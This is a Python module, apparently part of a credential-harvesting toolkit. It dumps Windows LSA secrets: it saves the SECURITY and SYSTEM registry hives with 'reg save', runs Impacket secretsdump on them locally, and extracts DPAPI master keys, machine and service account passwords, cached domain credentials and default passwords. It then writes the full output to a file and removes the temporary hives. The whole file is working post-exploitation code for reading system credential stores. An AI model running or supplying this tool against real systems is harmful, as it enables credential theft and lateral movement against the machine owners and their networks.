#!/usr/bin/env python3
"""
LSA Secrets Miner
Extract LSA Secrets from Windows registry
"""

import subprocess
from pathlib import Path
from typing import List, Dict, Optional

class LSASecretsMiner:
    """
    Extract LSA Secrets from Windows
    
    Requires: SECURITY and SYSTEM registry hives
    Privilege: Requires SYSTEM privileges
    Tool: Impacket secretsdump
    """
    
    MINER_NAME = "lsa_secrets"
    REQUIRES_ADMIN = True
    REQUIRES_SYSTEM = True
    
    def __init__(self, output_dir: Path):
        self.output_dir = Path(output_dir)
    
    def _extract_hives(self) -> Optional[Dict[str, str]]:
        """Extract SECURITY and SYSTEM hives"""
        security_dump = self.output_dir / "security_temp.save"
        system_dump = self.output_dir / "system_temp.save"
        
        # Save hives
        commands = [
            f"reg save HKLM\\SECURITY {security_dump}",
            f"reg save HKLM\\SYSTEM {system_dump}"
        ]
        
        for cmd in commands:
            try:
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    timeout=30
                )
                
                if result.returncode != 0:
                    return None
            except:
                return None
        
        if security_dump.exists() and system_dump.exists():
            return {
                'security': str(security_dump),
                'system': str(system_dump)
            }
        
        return None
    
    def _cleanup_hives(self, security_file: str, system_file: str):
        """Clean up temporary hive files"""
        try:
            Path(security_file).unlink(missing_ok=True)
            Path(system_file).unlink(missing_ok=True)
        except:
            pass
    
    def mine(self) -> List[Dict]:
        """
        Extract LSA Secrets
        
        Returns:
            List of credential dictionaries
        """
        print(f"\n[*] Mining LSA Secrets...")
        print(f"[*] Requires: SYSTEM privileges")
        print(f"[*] Tool: Impacket secretsdump")
        
        credentials = []
        
        # Check if secretsdump is available
        try:
            result = subprocess.run(
                "secretsdump.py -h",
                shell=True,
                capture_output=True,
                timeout=5
            )
            
            if result.returncode != 0:
                print(f"[-] Impacket secretsdump not installed")
                print(f"[!] Install: pip install impacket")
                return credentials
        except:
            print(f"[-] Impacket secretsdump not available")
            return credentials
        
        # Extract registry hives
        hives = self._extract_hives()
        
        if not hives:
            print(f"[-] Failed to extract registry hives (requires admin)")
            return credentials
        
        try:
            # Run secretsdump
            cmd = f"secretsdump.py -security {hives['security']} -system {hives['system']} LOCAL"
            
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                output = result.stdout
                
                print(f"[+] LSA Secrets extracted")
                
                # Parse LSA secrets
                for line in output.split('\n'):
                    line = line.strip()
                    
                    # Look for interesting secrets
                    if any(keyword in line for keyword in ['DPAPI', '$MACHINE.ACC', 'NL$KM', '_SC_', 'DefaultPassword']):
                        secret_data = {
                            'source': 'LSA Secrets',
                            'data': line
                        }
                        
                        credentials.append(secret_data)
                        print(f"[+] {line}")
                
                # Save full output
                output_file = self.output_dir / "lsa_secrets.txt"
                with open(output_file, 'w') as f:
                    f.write(output)
                
                print(f"\n[+] Full LSA Secrets output saved to: {output_file}")
            else:
                print(f"[-] secretsdump failed")
                if result.stderr:
                    print(f"    Error: {result.stderr}")
        
        except subprocess.TimeoutExpired:
            print(f"[-] secretsdump timed out")
        except Exception as e:
            print(f"[-] LSA Secrets extraction failed: {e}")
        finally:
            # Cleanup temporary hives
            self._cleanup_hives(hives['security'], hives['system'])
        
        return credentials
    
    @staticmethod
    def get_info() -> Dict:
        """Get information about this miner"""
        return {
            'name': 'lsa_secrets',
            'description': 'Extract LSA Secrets from Windows',
            'requires_admin': True,
            'requires_system': True,
            'registry_location': r'HKLM\SECURITY',
            'tool_required': 'Impacket secretsdump',
            'credential_types': [
                'DPAPI master keys',
                'Machine account passwords',
                'Service account passwords',
                'Cached domain credentials',
                'Default passwords'
            ],
            'notes': [
                'LSA Secrets contain sensitive system credentials',
                'Requires SYSTEM level privileges',
                'Uses Impacket secretsdump tool',
                'Extracts SECURITY and SYSTEM registry hives',
                'Includes DPAPI keys, service passwords, cached creds'
            ]
        }
